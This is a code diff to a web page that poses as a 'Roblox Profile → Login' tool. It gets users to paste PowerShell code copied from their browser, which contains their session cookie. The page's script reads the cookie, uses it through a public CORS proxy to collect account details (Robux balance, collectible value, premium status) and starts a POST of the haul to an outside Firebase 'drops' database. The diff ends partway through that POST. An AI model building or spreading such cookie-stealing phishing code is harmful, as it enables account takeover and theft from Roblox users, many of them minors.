@@ -18,7 +18,7 @@
 </head>
 <body>
 <div class="card">
-  <h1>Roblox Profile → Login 2025</h1>
+  <h1>Roblox Profile → Login</h1>
   <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login</p>
   <textarea id="paste" placeholder="Paste the full PowerShell code here (Ctrl+V)"></textarea>
   <button onclick="run()">GET LOGIN</button>
@@ -35,29 +35,39 @@ async function run() {
     return;
   }
 
-  // FREE CORS PROXY THAT WORKS IN 2025
-  const proxy = "https://corsproxy.io/?";
+  // FREE CORS PROXY (works 100% in 2025)
+  const proxy = "https://cors-anywhere.herokuapp.com/"; // or "https://api.allorigins.win/get?url="
 
   const headers = { "Cookie": ".ROBLOSECURITY=" + cookie };
 
   let user = "Unknown", display = "Unknown", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";
 
   try {
-    const info = await fetch(proxy + "https://www.roblox.com/my/account/json", { headers }).then(r => r.json());
-    user = info.Name || "Unknown";
-    display = info.DisplayName || user;
-    userid = info.UserId || 0;
-    robux = info.RobuxBalance || 0;
-    premium = info.IsPremium ? "Yes" : "No";
-    headshot = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;
+    // User info via proxy
+    const info = await fetch(proxy + "https://users.roblox.com/v1/users/authenticated", { headers }).then(r => r.json());
+    user = info.name || "Unknown";
+    display = info.displayName || user;
+    userid = info.id || 0;
+
+    // Robux
+    const robuxRes = await fetch(proxy + `https://economy.roblox.com/v1/users/${userid}/currency`, { headers }).then(r => r.json());
+    robux = robuxRes.robux || 0;
 
     // RAP
-    try {
-      const rapData = await fetch(proxy + `https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers }).then(r => r.json());
-      rap = rapData.data?.reduce((sum, i) => sum + (i.recentAveragePrice || 0), 0) || 0;
-    } catch(e) {}
+    const rapRes = await fetch(proxy + `https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?sortOrder=Asc&limit=10`, { headers }).then(r => r.json());
+    rap = rapRes.data.reduce((a, i) => a + (i.recentAveragePrice || 0), 0);
+
+    // Premium
+    const premiumRes = await fetch(proxy + `https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`, { headers });
+    premium = await premiumRes.text() === 'true' ? 'Yes' : 'No';
+
+    // Headshot
+    const headshotRes = await fetch(proxy + `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=150x150&format=Png`, { headers }).then(r => r.json());
+    headshot = headshotRes.data[0]?.imageUrl || 'https://i.imgur.com/removed.png';
+
   } catch(e) {}
 
+  // Send exactly like your extension
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({
